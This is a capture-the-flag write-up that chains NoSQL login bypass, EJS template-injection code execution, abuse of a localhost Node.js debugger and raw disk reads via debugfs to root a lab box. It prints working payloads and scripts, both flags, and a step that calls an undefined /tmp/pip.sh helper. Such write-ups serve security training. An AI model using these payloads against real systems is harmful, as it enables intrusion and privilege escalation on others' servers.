# CTF Write-up — Byte Lotus "Poolside"

- Target: `http://10.48.149.70`
- Flags:
  - **User:** `THM{w4rm_s3ss10n_h1j4ck3d}`
  - **Root:** `THM{r4w_d1sk_4cc3ss_w4s_t00_much}`

---

## Summary of the chain

```
NoSQL injection (login bypass)
        │  -> session as 'attendant' (staff role)
        ▼
EJS Server-Side Template Injection (RCE as poolside)
        │  -> user.txt
        ▼
Node.js inspector (--inspect=127.0.0.1:9229) running as pipelinesvc
        │  -> RCE as pipelinesvc
        ▼
pipelinesvc in group 'disk' -> read raw block device
        │  -> debugfs cat /root/root.txt
        ▼
ROOT FLAG
```

---

## 1. Recon

The box serves a single Express login page on port 80:

```bash
curl -s -i -X POST http://10.48.149.70/login -d 'username=attendant&password=x'
```

Response: `401 Unauthorized`, `X-Powered-By: Express`, body says "Invalid credentials."
A GET to a bogus path returns a 404 page of size 153, so only `/login` exists on the surface.

Key hints on the login page:

- Placeholder `attendant` -> a real username.
- *"The pool remembers your usual"* / *"Byte Lotus never forgets &middot; Stay Noticed&trade;"*
  -> the app "remembers" something (a session), and notice hints at side channels / injection.

---

## 2. Login bypass — NoSQL injection

Brute force with rockyou is a dead end: the server is slow (~1.5 s/request) and the
password is random. Express + MongoDB-style query handling hints at NoSQL injection.

The query is a raw object match, so injecting operators works:

```bash
# Form-encoded bracket syntax (urlencoded extended parsing -> nested objects)
curl -i -X POST http://10.48.149.70/login \
  -d 'username[$ne]=null&password[$ne]=null'
```

Response: **302 Found, Location: /staff** — login bypassed.

But `/staff` returned `403 Staff access only` with that session, because `$ne` matched the
first document in the collection (the `guest` user, role `guest`). To become **staff**, pin the
username to the placeholder value:

```bash
curl -i -c cookies.txt -X POST http://10.48.149.70/login \
  -d 'username=attendant&password[$ne]=null'
```

Result: `302 -> /staff`, and `/staff` now returns `200`.

> Why the whole DB check can be seen in the source (`/opt/poolside/app.js`), which we
> recovered later:
> ```js
> user = await db.findOneAsync({ username, password });
> req.session.user = { username: user.username, role: user.role };
> ```
> Also of note from the source: the session secret is hardcoded to
> `byte-lotus-poolside` — "Stay Noticed" was a hint that you could forge sessions too.

---

## 3. EJS SSTI -> RCE (user flag)

`/staff` exposes a template preview form (POST `/staff/preview`):

> *"Confirmation template (EJS — use `<%= guest %>` to personalise)"*

If the template is rendered server-side, `<%= ... %>` is raw JavaScript. Confirm:

```bash
curl -s -b cookies.txt -X POST http://10.48.149.70/staff/preview \
  --data-urlencode 'template=7*7 = <%= 7*7 %>'
```

Output contains `7*7 = 49` -> **SSTI confirmed** (EJS evaluates expressions).

RCE with the classic EJS chain:

```bash
curl -s -b cookies.txt -X POST http://10.48.149.70/staff/preview \
  --data-urlencode 'template=<%= process.mainModule.require("child_process").execSync("id").toString() %>'
```

```
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

Full command execution as `poolside`. I wrapped it in a helper:

```bash
# /tmp/rce.sh
CMD=$(python3 -c 'import sys,json; print(json.dumps(sys.argv[1]))' "$1")
TPL='<%= process.mainModule.require("child_process").execSync('"$CMD"').toString() %>'
curl -s -b cookies.txt -X POST http://10.48.149.70/staff/preview \
  --data-urlencode "template=$TPL" \
  | python3 -c 'import sys,re,html; m=re.search(r"<pre>(.*)</pre>", sys.stdin.read(), re.S); print(html.unescape(m.group(1)) if m else "(no pre output)")'
```

Find and read the user flag:

```bash
/tmp/rce.sh 'ls -la /home/poolside'
/tmp/rce.sh 'cat /home/poolside/user.txt'
```

**USER FLAG:** `THM{w4rm_s3ss10n_h1j4ck3d}`

---

## 4. RCE as `pipelinesvc` — Node.js inspector

While enumerating the box (`/etc/systemd/system/`), this service stands out:

```bash
/tmp/rce.sh 'cat /etc/systemd/system/lotus-telemetry.service'
```

```
[Unit]
Description=Byte Lotus Occupancy Telemetry Processor
[Service]
User=pipelinesvc
Group=pipelinesvc
WorkingDirectory=/opt/pipelinesvc/telemetry
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 processor.js
[Install]
WantedBy=multi-user.target
```

The telemetry processor runs as `pipelinesvc` **with the Node.js debugger listening on
127.0.0.1:9229**. The inspector allows arbitrary `Runtime.evaluate` over WebSocket.

From the poolside RCE, confirm the inspector is reachable (bind is localhost-only, so we must
go through our RCE, not directly from our machine):

```bash
/tmp/rce.sh 'node -v; curl -s http://127.0.0.1:9229/json/list'
```

- Node `v22.23.1` -> global `WebSocket`/`fetch` available.
- `/json/list` returns a target with `webSocketDebuggerUrl: ws://127.0.0.1:9229/<uuid>`.

Script to evaluate commands inside the `pipelinesvc` process (`/tmp/insp.js`):

```js
const targets = await (await fetch('http://127.0.0.1:9229/json/list')).json();
const url = targets[0].webSocketDebuggerUrl;
const cmd = process.argv[2] || 'id';
const expr = `(()=>{try{return process.mainModule.require("child_process").execSync(${JSON.stringify(cmd)}).toString()}catch(e){return "ERR: "+e.message}})()`;
const ws = new WebSocket(url);
const t = setTimeout(() => { console.log('TIMEOUT'); process.exit(1); }, 10000);
ws.onopen = () => ws.send(JSON.stringify({ id: 1, method: 'Runtime.evaluate', params: { expression: expr, returnByValue: true } }));
ws.onmessage = (e) => {
  const msg = JSON.parse(e.data);
  if (msg.id === 1) {
    console.log(msg.result && msg.result.result && msg.result.result.value !== undefined ? msg.result.result.value : JSON.stringify(msg));
    clearTimeout(t);
    ws.close();
    process.exit(0);
  }
};
```

Upload and run it through the poolside RCE:

```bash
B64=$(base64 -w0 /tmp/insp.js)
/tmp/rce.sh "echo $B64 | base64 -d > /tmp/insp.js && node /tmp/insp.js 'id && whoami && hostname'"
```

```
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
pipelinesvc
tryhackme-2404
```

**RCE as `pipelinesvc`** — and notice the bonus: **group `disk` (gid 6)**.

---

## 5. Group `disk` -> root flag

`group disk` on a system grants raw access to block devices. Root is an ext4 volume:

```bash
/tmp/rce.sh "lsblk"
# nvme0n1p1  259:2  20G  part  /
```

Check the device permissions and grab the root flag with `debugfs` (works without mounting,
even on a live filesystem):

```bash
/tmp/rce.sh "ls -la /dev/nvme0n1p1; /tmp/pip.sh 'debugfs -R \"cat /root/root.txt\" /dev/nvme0n1p1 2>/dev/null'"
```

```
brw-rw---- 1 root disk 259, 2 Aug  5 08:51 /dev/nvme0n1p1
THM{r4w_d1sk_4cc3ss_w4s_t00_much}
```

**ROOT FLAG:** `THM{r4w_d1sk_4cc3ss_w4s_t00_much}`

---

## Key takeaways

1. **NoSQL injection** — operator injection (`$ne`, `$gt`, `$regex`) works whenever a query is
   built from user input as a raw object. Pin the username to avoid landing in the wrong role.
2. **EJS SSTI** — any `ejs.render()` on user input is RCE. `process.mainModule.require(...)`
   gives you the full child_process.
3. **Node `--inspect`** — a debugger bound to localhost is still exploitable *from the box*:
   hit `/json/list`, then drive `Runtime.evaluate` over WebSocket (Node 22 has a global
   `WebSocket`).
4. **Group `disk`** — read block devices directly (`debugfs`) to bypass filesystem permissions.
   Always check supplementary groups after a lateral move.
